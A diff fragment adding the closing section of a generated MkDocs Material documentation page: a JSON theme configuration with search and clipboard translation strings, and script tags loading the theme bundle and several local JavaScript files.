+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "toc.integrate", "toc.follow", "navigation.tracking", "content.code.copy", "content.code.annotate", "navigation.top", "navigation.footer", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/runaway-bat.js"></script>
+      
+        <script src="../../javascripts/sidebar-follow-active.js"></script>
+      
+        <script src="../../javascripts/page-up.js"></script>
+      
+        <script src="../../javascripts/checklist-state.js"></script>
+      
+    
+  </body>
+</html>
